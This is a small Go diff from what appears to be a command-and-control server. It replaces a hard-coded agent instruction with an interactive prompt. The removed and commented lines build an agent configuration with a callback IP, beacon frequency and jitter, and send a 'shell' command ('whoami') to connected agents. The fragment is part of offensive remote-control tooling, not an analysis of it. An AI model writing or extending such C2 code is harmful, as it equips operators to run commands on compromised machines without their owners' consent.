@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"encoding/gob"
 	"fmt"
 	"log"
 	"net"
@@ -15,9 +14,19 @@ import (
 
 func handleconn(connection net.Conn) {
 	for {
-		encoder := gob.NewEncoder(connection)
-		instruct := &agent.giveAgentCommand{&agent.configAgent{"1234", "192.20.20.12", 5, 4.5}, "shell", "whoami", nil}
-		encoder.Encode(instruct)
+		// encoder := gob.NewEncoder(connection)
+		// instruct := types.GiveAgentCommand{
+		// 	UpdateAgentConfig: types.ConfigAgent{
+		// 		Uuid:              "1234",
+		// 		CallbackTo:        "192.20.20.12",
+		// 		CallbackFrequency: 5,
+		// 		CallbackJitter:    4.5,
+		// 	},
+		// 	CommandType: "shell",
+		// 	Command:     "whoami",
+		// 	Binary:      nil,
+		// }
+		// encoder.Encode(instruct)
 		reader := bufio.NewReader(os.Stdin)
 		fmt.Print(">> ")
 		text, _ := reader.ReadString('\n')
